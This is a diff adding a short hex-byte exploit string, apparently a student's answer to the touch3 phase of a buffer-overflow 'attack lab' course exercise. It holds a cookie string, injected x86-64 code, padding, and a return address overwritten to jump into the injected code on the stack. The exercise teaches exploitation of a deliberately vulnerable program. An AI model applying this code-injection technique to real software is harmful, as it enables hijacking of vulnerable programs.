@@ -1,0 +1,7 @@
+35 39 62 39 39 37 66 61 00 /* 59b997fa(cookie) */
+48 83 c4 80                /* add    $-128,%rsp */
+68 fa 18 40 00       	   /* pushq  touch3_address */
+48 c7 c7 78 dc 61 55 	   /* mov    string_address,%rdi */
+c3                         /* ret */
+62 6C 61 20 62 6C 61 20 62 6C 61 20 62 6C /* bla bla .. (14) */
+81 dc 61 55                /* address of code above */
